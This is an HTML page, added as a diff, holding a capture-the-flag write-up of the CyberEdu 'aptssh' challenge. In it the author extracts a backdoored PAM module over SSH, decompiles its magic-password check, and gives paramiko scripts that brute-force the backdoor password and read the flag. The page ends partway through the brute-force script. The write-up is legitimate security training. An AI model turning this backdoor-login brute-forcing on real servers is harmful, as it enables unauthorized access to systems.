@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CyberEdu aptssh Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="CyberEdu, pwn, reverse-engineering, ssh">
+<meta name="description" content="Challenge overview
+Someone backdoored us with a strange PAM module, and now anyone can log in with aptssh:aptssh. I think they were able to get our flag.
+First of all, what is a PAM module? Well, PAM stands for Pluggable Authentification Modules, and it&rsquo;s how Linux decides how we can log in, how passwords are checked, and so on.
+
+So, nc isn&rsquo;t going to be how we solve this. Instead, we&rsquo;re going to login using ssh like so:">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/aptssh-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/aptssh-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/aptssh-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="CyberEdu aptssh Writeup">
+  <meta property="og:description" content="Challenge overview Someone backdoored us with a strange PAM module, and now anyone can log in with aptssh:aptssh. I think they were able to get our flag.
+First of all, what is a PAM module? Well, PAM stands for Pluggable Authentification Modules, and it’s how Linux decides how we can log in, how passwords are checked, and so on.
+So, nc isn’t going to be how we solve this. Instead, we’re going to login using ssh like so:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-12-23T00:00:00+00:00">
+    <meta property="article:tag" content="CyberEdu">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Reverse-Engineering">
+    <meta property="article:tag" content="Ssh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CyberEdu aptssh Writeup">
+<meta name="twitter:description" content="Challenge overview
+Someone backdoored us with a strange PAM module, and now anyone can log in with aptssh:aptssh. I think they were able to get our flag.
+First of all, what is a PAM module? Well, PAM stands for Pluggable Authentification Modules, and it&rsquo;s how Linux decides how we can log in, how passwords are checked, and so on.
+
+So, nc isn&rsquo;t going to be how we solve this. Instead, we&rsquo;re going to login using ssh like so:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CyberEdu aptssh Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/aptssh-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CyberEdu aptssh Writeup",
+  "name": "CyberEdu aptssh Writeup",
+  "description": "Challenge overview Someone backdoored us with a strange PAM module, and now anyone can log in with aptssh:aptssh. I think they were able to get our flag.\nFirst of all, what is a PAM module? Well, PAM stands for Pluggable Authentification Modules, and it\u0026rsquo;s how Linux decides how we can log in, how passwords are checked, and so on.\nSo, nc isn\u0026rsquo;t going to be how we solve this. Instead, we\u0026rsquo;re going to login using ssh like so:\n",
+  "keywords": [
+    "CyberEdu", "pwn", "reverse-engineering", "ssh"
+  ],
+  "articleBody": "Challenge overview Someone backdoored us with a strange PAM module, and now anyone can log in with aptssh:aptssh. I think they were able to get our flag.\nFirst of all, what is a PAM module? Well, PAM stands for Pluggable Authentification Modules, and it’s how Linux decides how we can log in, how passwords are checked, and so on.\nSo, nc isn’t going to be how we solve this. Instead, we’re going to login using ssh like so:\nssh aptssh@34.89.226.167 -p 31427\n(Obviously different ip and port than I used). After inputting our password, aptssh, as hinted by the description, we get this back:\nGetting the ELF Alright, so, weird, what could this be? Well, since this is still a pwn challenge, guess what, an ELF! (More precisely, two). We can tell because of the ELF so file header bytes (\\004\\274\\242\\301\\303\\). Let’s see if we can tell what’s happening by b64 decoding the input.\nWe can find a lot of interesting strings:\n/lib/security/pam_passfile.so\n/home/sshuser/pass.txt\nUsername:\naptssh\nsend_debug_message\noutput_base64_file\npam_sm_authenticate\nI extracted the entire file using script -q -c \"ssh -tt aptssh@34.89.226.167 -p 31427\" dump.bin. I removed the first and last lines, then ran this:\nstrings dump.bin \\ | grep -E '[A-Za-z0-9+/]{200,}={0,2}' \\ | tr -d '\\n' \\ \u003e b64.txt Then this:\nbase64 -d b64.txt \u003e pam_dump.so And finally, we get the ELF so file.\nAnalyzing the ELF We find a couple interesting functions here:\nAnd then this longer function, pam_sm_authenticate:\nWhat’s important here, are these lines of code:\nif ( strlen(s1) \u003e 100 ) { v5 = 7000; do v5 -= 8; while ( v5 ); s2 = 0xADC29EC3; v18 = 0xAFC3; v17 = v13; s[0] = 0; result = memcmp(s1 + 100, \u0026s2, 9u); if ( !result ) { v10 = 10000; do v10 -= 8; while ( v10 ); return result; } } For all passwords longer than 100, we compare the 9 bytes starting at s1 + 100 with the ones starting at s2. And this is what our stack looks like:\ns2 = -1379754301; // 4 bytes v18 = -20541; // 2 bytes v17 = v13; // 2 bytes (uninitialized but later zeroed) s[0] = 0; // 1 byte So the password has to be [ any 100 bytes ] and then some specific bytes, \\xAD\\xC2\\x9E\\xC3 \\x??\\x?? \\xAF\\xC3 \\x00.\nWe can verify this since if the password is over 100 characters long, like in the first part of the image, connection gets closed immediately, but otherwise any length under 100 asks for the password again:\nThere’s a big problem though, we can’t pass raw bytes as ssh terminal input. And these characters are non-printable. So the workaround for this is using paramiko. paramiko avoids the tty completely, and can therefore send raw bytes. Those bytes I marked with \\x??\\x?? are the v17=v13 that we have no idea about, so we might have to bruteforce them.\nBut guess what, I thought paramiko is unstable on python 3.13, because why wouldn’t it be? So I moved to a python 3.11 venv. I made one using pyenv and installing python 3.11. I named it python311, and pyenv created it at ~/.pyenv/versions/python311/, and I can always activate it like so: pyenv activate python311. If this seems like a lot of unnecessary detail, it’s so I myself can remember what I installed in a week from now, when I’ll have forgotten whatever it is I did today.\nSame error on python 3.11, that I got on 3.13, that made me think it was a compatibility issue.\nRight now, my payload looks like so:\nimport paramiko from pwn import * cli = paramiko.SSHClient() cli.set_missing_host_key_policy(paramiko.AutoAddPolicy()) payload = b\"a\" * 100 #s2 payload += p32(0xADC29EC3) #4 bytes so p32 #v17 - no clue what this is payload += p16(0xABCD) #2 bytes so p16 #v18 payload += p16(0xAFC3) #s[0] payload += b'\\x00' cli.connect( hostname='34.89.226.167', port=30266, username='sshuser', password=payload ) stdin, stdout, stderr = cli.exec_command(\"id\") print(stdout.read().decode()) cli.close() The problem is we didn’t input the correct password. Why? Because we don’t have a clue what v17 could be. So we’re going to have to bruteforce it.\nI ran this script and watched about five episodes of Seinfeld, when I realized that when my laptop automatically enters sleep mode no connections are being made:\nimport paramiko from pwn import * for v17 in range(0xFFFF, -1, -1): cli = paramiko.SSHClient() cli.set_missing_host_key_policy(paramiko.AutoAddPolicy()) payload = b\"a\" * 100 payload += p32(0xADC29EC3) payload += p16(v17) payload += p16(0xAFC3) payload += b'\\x00' try: cli.connect( hostname='34.89.226.167', port=30266, username='sshuser', password=payload, timeout=0.3, banner_timeout=0.3, auth_timeout=0.3, allow_agent=False, look_for_keys=False ) print(f\"v17 = {hex(v17)}\") stdin, stdout, stderr = cli.exec_command(\"cat flag.txt\") print(stdout.read().decode()) cli.close() break except paramiko.ssh_exception.AuthenticationException: pass except Exception: pass cli.close() if v17 % 256 == 0: print(f\"tried {hex(v17)}\") So the second time I used caffeine and we get the flag! Took about half an hour or so.\nTo be completely honest, there might’ve been a way to actually find out v17’s value, but if it works it works right?\nAs always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "830",
+  "inLanguage": "en",
+  "datePublished": "2025-12-23T00:00:00Z",
+  "dateModified": "2025-12-23T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/aptssh-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CyberEdu aptssh Writeup
+    </h1>
+    <div class="post-meta"><span title='2025-12-23 00:00:00 +0000 UTC'>December 23, 2025</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#getting-the-elf" aria-label="Getting the ELF">Getting the ELF</a></li>
+                <li>
+                    <a href="#analyzing-the-elf" aria-label="Analyzing the ELF">Analyzing the ELF</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>Someone backdoored us with a strange PAM module, and now anyone can <strong><a href="https://app.cyber-edu.co/challenges/9d17be93-349a-4de8-acb8-045c03fe7b5b?tenant=cyberedu">log in</a></strong> with aptssh:aptssh. I think they were able to get our flag.</p>
+<p>First of all, what is a <em>PAM module</em>? Well, PAM stands for Pluggable Authentification Modules, and it&rsquo;s how Linux decides how we can log in, how passwords are checked, and so on.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/aptssh-writeup/pic1.png#center"></p>
+<p>So, nc isn&rsquo;t going to be how we solve this. Instead, we&rsquo;re going to login using <code>ssh</code> like so:</p>
+<p><code>ssh aptssh@34.89.226.167 -p 31427</code></p>
+<p>(Obviously different ip and port than I used). After inputting our password, aptssh, as hinted by the description, we get this back:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/aptssh-writeup/pic2.png#center"></p>
+<hr>
+<h2 id="getting-the-elf">Getting the ELF<a hidden class="anchor" aria-hidden="true" href="#getting-the-elf">#</a></h2>
+<p>Alright, so, weird, what could this be? Well, since this is still a <code>pwn</code> challenge, guess what, an <strong>ELF</strong>! (More precisely, two). We can tell because of the ELF so file header bytes (<code>\004\274\242\301\303\</code>). Let&rsquo;s see if we can tell what&rsquo;s happening by b64 decoding the input.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/aptssh-writeup/pic3.png#center"></p>
+<p>We can find a lot of interesting strings:</p>
+<ul>
+<li>
+<p>/lib/security/pam_passfile.so</p>
+</li>
+<li>
+<p>/home/sshuser/pass.txt</p>
+</li>
+<li>
+<p>Username:</p>
+</li>
+<li>
+<p>aptssh</p>
+</li>
+<li>
+<p>send_debug_message</p>
+</li>
+<li>
+<p>output_base64_file</p>
+</li>
+<li>
+<p>pam_sm_authenticate</p>
+</li>
+</ul>
+<p>I extracted the entire file using <code>script -q -c &quot;ssh -tt aptssh@34.89.226.167 -p 31427&quot; dump.bin</code>. I removed the first and last lines, then ran this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>strings dump<span style="color:#f92672">.</span>bin \
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> grep <span style="color:#f92672">-</span>E <span style="color:#e6db74">&#39;[A-Za-z0-9+/]{200,}={0,2}&#39;</span> \
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> tr <span style="color:#f92672">-</span>d <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> \
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> b64<span style="color:#f92672">.</span>txt
+</span></span></code></pre></div><p>Then this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>base64 <span style="color:#f92672">-</span>d b64<span style="color:#f92672">.</span>txt <span style="color:#f92672">&gt;</span> pam_dump<span style="color:#f92672">.</span>so
+</span></span></code></pre></div><p>And finally, we get the ELF so file.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/aptssh-writeup/pic4.png#center"></p>
+<hr>
+<h2 id="analyzing-the-elf">Analyzing the ELF<a hidden class="anchor" aria-hidden="true" href="#analyzing-the-elf">#</a></h2>
+<p>We find a couple interesting functions here:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/aptssh-writeup/pic5.png#center"></p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/aptssh-writeup/pic6.png#center"></p>
+<p>And then this longer function, <code>pam_sm_authenticate</code>:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/aptssh-writeup/pic7.png#center"></p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/aptssh-writeup/pic8.png#center"></p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/aptssh-writeup/pic9.png#center"></p>
+<p>What&rsquo;s important here, are these lines of code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( strlen(s1) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">7000</span>;
+</span></span><span style="display:flex;"><span>    do
+</span></span><span style="display:flex;"><span>      v5 <span style="color:#f92672">-=</span> <span style="color:#ae81ff">8</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( v5 );
+</span></span><span style="display:flex;"><span>    s2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xADC29EC3</span>;
+</span></span><span style="display:flex;"><span>    v18 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xAFC3</span>;
+</span></span><span style="display:flex;"><span>    v17 <span style="color:#f92672">=</span> v13;
+</span></span><span style="display:flex;"><span>    s[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> memcmp(s1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">100</span>, <span style="color:#f92672">&amp;</span>s2, <span style="color:#ae81ff">9</span>u);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#960050;background-color:#1e0010">!</span>result )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      v10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000</span>;
+</span></span><span style="display:flex;"><span>      do
+</span></span><span style="display:flex;"><span>        v10 <span style="color:#f92672">-=</span> <span style="color:#ae81ff">8</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ( v10 );
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>For all passwords longer than 100, we compare the 9 bytes starting at s1 + 100 with the ones starting at s2. And this is what our stack looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>s2  <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1379754301</span>;   <span style="color:#f92672">//</span> <span style="color:#ae81ff">4</span> bytes
+</span></span><span style="display:flex;"><span>v18 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">20541</span>;        <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span> bytes
+</span></span><span style="display:flex;"><span>v17 <span style="color:#f92672">=</span> v13;           <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span> bytes (uninitialized but later zeroed)
+</span></span><span style="display:flex;"><span>s[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;            <span style="color:#f92672">//</span> <span style="color:#ae81ff">1</span> byte
+</span></span></code></pre></div><p>So the password has to be
+<code>[ any 100 bytes ]</code> and then some specific bytes, <code>\xAD\xC2\x9E\xC3 \x??\x?? \xAF\xC3 \x00</code>.</p>
+<p>We can verify this since if the password is over 100 characters long, like in the first part of the image, connection gets closed immediately, but otherwise any length under 100 asks for the password again:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/aptssh-writeup/pic10.png#center"></p>
+<p>There&rsquo;s a big problem though, we can&rsquo;t pass raw bytes as <code>ssh</code> terminal input. And these characters are non-printable. So the workaround for this is using <code>paramiko</code>. <code>paramiko</code> avoids the <code>tty</code> completely, and can therefore send raw bytes. Those bytes I marked with <code>\x??\x??</code> are the <code>v17=v13</code> that we have no idea about, so we might have to bruteforce them.</p>
+<p>But guess what, I thought paramiko is unstable on python 3.13, because why wouldn&rsquo;t it be? So I moved to a python 3.11 venv. I made one using <code>pyenv</code> and installing python 3.11. I named it <code>python311</code>, and <code>pyenv</code> created it at <code>~/.pyenv/versions/python311/</code>, and I can always activate it like so: <code>pyenv activate python311</code>. If this seems like a lot of unnecessary detail, it&rsquo;s so I myself can remember what I installed in a week from now, when I&rsquo;ll have forgotten whatever it is I did today.</p>
+<p>Same error on python 3.11, that I got on 3.13, that made me think it was a compatibility issue.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/aptssh-writeup/pic11.png#center"></p>
+<p>Right now, my payload looks like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> paramiko
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cli <span style="color:#f92672">=</span> paramiko<span style="color:#f92672">.</span>SSHClient()
+</span></span><span style="display:flex;"><span>cli<span style="color:#f92672">.</span>set_missing_host_key_policy(paramiko<span style="color:#f92672">.</span>AutoAddPolicy())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#s2</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xADC29EC3</span>) <span style="color:#75715e">#4 bytes so p32</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#v17 - no clue what this is</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">0xABCD</span>) <span style="color:#75715e">#2 bytes so p16</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#v18</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">0xAFC3</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#s[0]</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cli<span style="color:#f92672">.</span>connect(
+</span></span><span style="display:flex;"><span>    hostname<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;34.89.226.167&#39;</span>,
+</span></span><span style="display:flex;"><span>    port<span style="color:#f92672">=</span><span style="color:#ae81ff">30266</span>,
+</span></span><span style="display:flex;"><span>    username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;sshuser&#39;</span>,
+</span></span><span style="display:flex;"><span>    password<span style="color:#f92672">=</span>payload
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>stdin, stdout, stderr <span style="color:#f92672">=</span> cli<span style="color:#f92672">.</span>exec_command(<span style="color:#e6db74">&#34;id&#34;</span>)
+</span></span><span style="display:flex;"><span>print(stdout<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cli<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>The problem is we didn&rsquo;t input the correct password. Why? Because we don&rsquo;t have a clue what <code>v17</code> could be. So we&rsquo;re going to have to bruteforce it.</p>
+<p>I ran this script and watched about five episodes of Seinfeld, when I realized that when my laptop automatically enters sleep mode no connections are being made:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> paramiko
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> v17 <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0xFFFF</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cli <span style="color:#f92672">=</span> paramiko<span style="color:#f92672">.</span>SSHClient()
+</span></span><span style="display:flex;"><span>    cli<span style="color:#f92672">.</span>set_missing_host_key_policy(paramiko<span style="color:#f92672">.</span>AutoAddPolicy())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xADC29EC3</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p16(v17)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">0xAFC3</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        cli<span style="color:#f92672">.</span>connect(
+</span></span><span style="display:flex;"><span>            hostname<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;34.89.226.167&#39;</span>,
+</span></span><span style="display:flex;"><span>            port<span style="color:#f92672">=</span><span style="color:#ae81ff">30266</span>,
+</span></span><span style="display:flex;"><span>            username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;sshuser&#39;</span>,
+</span></span><span style="display:flex;"><span>            password<span style="color:#f92672">=</span>payload,
+</span></span><span style="display:flex;"><span>            timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.3</span>,
+</span></span><span style="display:flex;"><span>            banner_timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.3</span>,
+</span></span><span style="display:flex;"><span>            auth_timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.3</span>,
+</span></span><span style="display:flex;"><span>            allow_agent<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>            look_for_keys<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;v17 = </span><span style="color:#e6db74">{</span>hex(v17)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        stdin, stdout, stderr <span style="color:#f92672">=</span> cli<span style="color:#f92672">.</span>exec_command(<span style="color:#e6db74">&#34;cat flag.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(stdout<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        cli<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> paramiko<span style="color:#f92672">.</span>ssh_exception<span style="color:#f92672">.</span>AuthenticationException:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
